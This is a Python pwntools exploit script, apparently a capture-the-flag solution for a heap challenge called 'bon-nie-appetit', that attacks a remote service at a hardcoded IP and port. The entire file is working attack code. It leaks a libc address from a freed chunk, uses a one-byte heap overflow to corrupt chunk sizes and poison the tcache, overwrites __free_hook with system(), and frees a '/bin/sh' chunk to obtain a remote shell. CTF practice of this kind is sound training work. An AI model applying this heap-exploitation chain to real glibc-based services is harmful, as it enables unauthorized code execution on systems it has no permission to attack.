#!/usr/bin/env python3

from pwn import *

exe = ELF("./bon-nie-appetit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
sh = remote('83.136.252.14',35324)
#gdb.attach(sh,gdbscript='''
#           b*new_order+127
#           b*new_order+211
#           b*edit_order+215
#           b*delete_order+156
#           b*show_order+123
#           b*edit_order+173
#           ''')

def make(size, data):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', str(size))
    sh.sendlineafter(b':', data)

def show(index):
    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', str(index))

def edit(index, data):
    sh.sendlineafter(b'>', b'3')
    sh.sendlineafter(b':', str(index))
    sh.sendlineafter(b':', data)

def delete(index):
    sh.sendlineafter(b'>', b'4')
    sh.sendlineafter(b':', str(index))

def finalize():
    sh.sendlineafter(b'>', b'5')

make(0x428, b'A') # size field 0x430
make(24, b'B') 
delete(0) # delete chunk idx 0
delete(1) # delete chunk idx 1
make(0x428, b'') 
show(0)

sh.recvuntil(b"=> ")
get = u64(sh.recv(6) + b'\x00' * 2)
log.info(f'libc leak --> {hex(get)}')

libc.address = get - 4111370
log.success(f'LIBC BASE --> {hex(libc.address)}')

delete(0) # remove data at chunk 0
make(0x28, b'X' * 0x28) # allocate new data at chunk 0
make(0x28, b'Y' * 0x28) # allocate new data at chunk 1
make(0x28, b'Z' * 0x28) # allocate new data at chunk 2

edit(0, b'M' * 0x28 + p8(0x81)) # overflow chunk 0 until and overlap the size field of chunk 2 to 0x81
input()
delete(1) # remove data at chunk 1
delete(2) # remove data at chunk 2

# overlap size field of chunk 2 to 0x21 and change it's FD to __free_hook()
make(0x78, b'D' * 0x28 + pack(0x21) + p64(libc.sym['__free_hook'])) 
make(0x28, b'/bin/sh\x00') # store /bin/sh strings as FD of chunk 2
make(0x28, p64(libc.sym['system'])) # change _free_hook to system()

delete(2) # trigger overwritten __free_hook() --> system("/bin/sh").

sh.interactive()
